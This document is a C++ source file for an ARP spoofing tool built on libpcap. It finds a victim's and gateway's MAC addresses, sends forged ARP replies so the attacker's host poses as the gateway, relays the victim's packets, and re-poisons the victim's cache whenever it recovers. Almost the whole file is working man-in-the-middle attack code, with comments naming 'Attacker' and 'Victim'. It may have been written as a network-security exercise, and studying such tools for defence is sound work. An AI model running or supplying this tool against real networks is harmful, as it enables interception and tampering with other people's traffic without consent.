#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <thread>

using namespace std;

#define PROMISCUOUS 1

struct ether_arp_hdr {
    unsigned char   	h_dest[6];      /* destination eth addr	*/
    unsigned char   	h_source[6];	/* source ether addr	*/
    unsigned short    h_proto;      	/* packet type ID field	*/

    unsigned short int ar_hrd;      	/* Format of hardware address.  */
    unsigned short int ar_pro;      	/* Format of protocol address.  */
    unsigned char ar_hln;               /* Length of hardware address.  */
    unsigned char ar_pln;               /* Length of protocol address.  */
    unsigned short int ar_op;       	/* ARP opcode (command).  */

    unsigned char __ar_sha[6];          /* Sender hardware address.  */
    unsigned char __ar_sip[4];      	/* Sender IP address.  */
    unsigned char __ar_tha[6];          /* Target hardware address.  */
    unsigned char __ar_tip[4];          /* Target IP address.  */
};

struct ether_hdr {
    unsigned char   	h_dest[6];      /* destination eth addr	*/
    unsigned char   	h_source[6];	/* source ether addr	*/
    unsigned short    h_proto;      	/* packet type ID field	*/
};

struct ether_ip_hdr {
    struct ether_hdr eth;
    unsigned char ip_v;		            /* version */
    unsigned char ip_hl;		        /* header length */
    u_int8_t ip_tos;			        /* type of service */
    u_short ip_len;			            /* total length */
    u_short ip_id;			            /* identification */
    u_short ip_off;			            /* fragment offset field */
    #define	IP_RF 0x8000			    /* reserved fragment flag */
    #define	IP_DF 0x4000	    		/* dont fragment flag */
    #define	IP_MF 0x2000	    		/* more fragments flag */
    #define	IP_OFFMASK 0x1fff	    	/* mask for fragmenting bits */
    u_int8_t ip_ttl;        			/* time to live */
    u_int8_t ip_p;		         	    /* protocol */
    u_short ip_sum;			            /* checksum */
    struct in_addr ip_src, ip_dst;	    /* source and dest address */
};

struct ifreq ifr;
int get_my_mac(char *dev, char *packet) { // from interface
    
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) {
        cout << "Socket error" << endl;
        return -1;
    }

    strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        cout << "get_may_mac error" << endl;
        return -1;
    }
    memcpy(packet, ifr.ifr_ifru.ifru_hwaddr.sa_data, 6);

    return 0;
}

int change_ip(char ip[], char *packet) {

    sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(ip);
    memcpy(packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

    return 0;
}

struct ether_arp_hdr *eth_arp_hdr;
int arp_packet(int op) {
    
    eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
    eth_arp_hdr->ar_hrd = htons(0x0001);
    eth_arp_hdr->ar_pro = htons(0x0800);
    eth_arp_hdr->ar_hln = 0x06;
    eth_arp_hdr->ar_pln = 0x04;
    eth_arp_hdr->ar_op = htons(op);

    return 0;
}

int send_request(pcap_t *pcd, char my_mac[6], char *my_ip, char *victim_ip) {

    // 1. (REQ) Attacker -> Victim
    // 3. (REQ) Attacker -> Gateway

    memcpy(eth_arp_hdr->h_source, my_mac, 6);
    memset(eth_arp_hdr->h_dest, 0xff, 6);

    arp_packet(0x0001);

    memcpy(eth_arp_hdr->__ar_sha, my_mac, 6);
    memcpy(eth_arp_hdr->__ar_sip, my_ip, 4);
    memset(eth_arp_hdr->__ar_tha, 0x00, 6);
    memcpy(eth_arp_hdr->__ar_tip, victim_ip, 4);

    if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
        cout << "Error send arp request" << endl;
        return -1;
    } else cout << endl << "(REQ) Send arp request (from broadcast)" << endl;

    return 0;
}

struct pcap_pkthdr *pkthdr;
const u_char *packet;
int res;
int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *my_ip, char *sender_ip, char get_ip[4], char get_mac[6]) {

    // 2. (RES) Victim -> Attacker ( Get victim mac )
    // 4. (RES) Gateway -> Attacker ( Get gateway mac )

    while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
           if(res == 0) continue;
           if(res < 0) {
               cout << "Error reading the packets" << pcap_geterr(pcd);
               return -1;
           }

           eth_arp_hdr = (struct ether_arp_hdr*)packet;

           if(eth_arp_hdr->h_proto == htons(ETHERTYPE_ARP)
                   && memcmp(eth_arp_hdr->h_dest, my_mac, 6)==0
                   && memcmp(eth_arp_hdr->__ar_sip, sender_ip, 4)==0
                   && memcmp(eth_arp_hdr->__ar_tha, my_mac, 6)==0
                   && memcmp(eth_arp_hdr->__ar_tip, my_ip, 4)==0) {

               memcpy(get_mac, eth_arp_hdr->h_source, 6);
               change_ip((char*)eth_arp_hdr->__ar_sip, get_ip);
               break;
           }
       }
    return 0;
}

int arp_infection_packet(char *dev, pcap_t *pcd, char victim_mac[6], char my_mac[6], char *gateway_ip, char *victim_ip, int time) {

    // because come ARP broadcast periodically.

        // Attacker (like gateway) -> Victim
        memcpy(eth_arp_hdr->h_dest, victim_mac, 6);
        memcpy(eth_arp_hdr->h_source, my_mac, 6);

        arp_packet(0x0002); // reply

        memcpy(eth_arp_hdr->__ar_sha, my_mac, 6);
        memcpy(eth_arp_hdr->__ar_sip, gateway_ip, 4);
        memcpy(eth_arp_hdr->__ar_tha, victim_mac, 6);
        memcpy(eth_arp_hdr->__ar_tip, victim_ip, 4);

        if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
            cout << "Error send arp infaction packet" << endl;
            return -1;
        } else cout << endl << "[Infaction] Send arp infaction packet" << endl;

        if(time == 1) {
            sleep(2);
        }
        return 0;
}

int ip_relay_packet(pcap_t *pcd, char *dev, char my_mac[6], char victim_mac[6], char gateway_mac[6], char *victim_ip, char *gateway_ip) {

        // 1. Victim -> Attacker (Come ip packet)
        // 2. Attacker -> Gateway
        // 3. Gateway -> Victim (auto)

        while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {

            if(res == 0) continue;
            if(res < 0) {
                cout << "Error reading the packets" << pcap_geterr(pcd);
                return -1;
            }

            struct ether_hdr *eth_h;
            eth_h = (struct ether_hdr*)packet;

            if(eth_h->h_proto == htons(ETHERTYPE_IP) //) {
                && memcmp(eth_h->h_dest, my_mac, 6)==0
                        && memcmp(eth_h->h_source, victim_mac, 6)==0) {

                    // (SEND) Victim : Victim request packet
                    // (RECEIVE) Attacker
                    // (SEND) The packet to gateway

                    cout << "[Relay] GET victim request packet";
                    memcpy(eth_h->h_dest, gateway_mac, 6);
                    memcpy(eth_h->h_source, my_mac, 6);

                    if(pcap_sendpacket(pcd, (const u_char*)eth_h, pkthdr->caplen) != 0) {
                        cout << "[Relay] Error send relay packet" << endl << endl;
                    } else cout << endl << "[Relay] Send relay packet to gateway" << endl << endl;
                    break;
            }

            // (Recovery) because recovery infection.
            if(eth_h->h_proto == htons(ETHERTYPE_ARP)) { // 0x0806 // reply
                if(memcmp(eth_h->h_source, victim_mac, 6)==0) {
                    arp_infection_packet(dev, pcd, victim_mac, my_mac, gateway_ip, victim_ip, 2);
                }
                break;
            }
        }
}

int main(int argc, char *argv[]) {

    eth_arp_hdr = new ether_arp_hdr;
    char errbuf[PCAP_ERRBUF_SIZE];

    // Check
    cout << "* Check input value *" << endl
         << "  1 Device : " << argv[1] << endl
         << "  2 GatewayIP : " << hex << argv[2] << endl
         << "  3 VictimIP : " << argv[3] << endl
         << "  4 AttackerIP : " << argv[4];

    char *dev = argv[1];
    char my_mac[6];
    get_my_mac(dev, my_mac);
    cout << my_mac << endl;

    char *my_ip = argv[4];
    change_ip(my_ip, my_ip);

    char *gateway_ip = argv[2];
    change_ip(gateway_ip, gateway_ip);

    char *victim_ip = argv[3];
    change_ip(victim_ip, victim_ip);

    char get_victim_mac[6];
    char get_gateway_mac[6];
    char get_gateway_ip[4];

    pcap_t *pcd;
    if((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 1, errbuf)) == NULL) {
        cout << "Unable to open the Adapter.";
        return -1;
    }

    // Get victim mac
    send_request(pcd, my_mac, my_ip, victim_ip); // for broadcast
    get_mac_and_ip(pcd, dev, my_mac, my_ip, victim_ip, get_gateway_ip, get_victim_mac);
    cout << "   == Get victim mac" << endl;
    sleep(1);

    // Get gateway mac
    send_request(pcd, my_mac, my_ip, gateway_ip);
    get_mac_and_ip(pcd, dev, my_mac, my_ip, gateway_ip, get_gateway_ip, get_gateway_mac);
    sleep(1);
    cout << "   == Get gateway mac\n\n\n";

    cout << "***** ARP Spoofing Start *****" << endl;
    while(1) {
        thread t1(arp_infection_packet, dev, pcd, get_victim_mac, my_mac, gateway_ip, victim_ip, 1);
        thread t2(ip_relay_packet, pcd, dev, my_mac, get_victim_mac, get_gateway_mac, victim_ip, gateway_ip);
        t2.join();
        t1.join();
    }
}
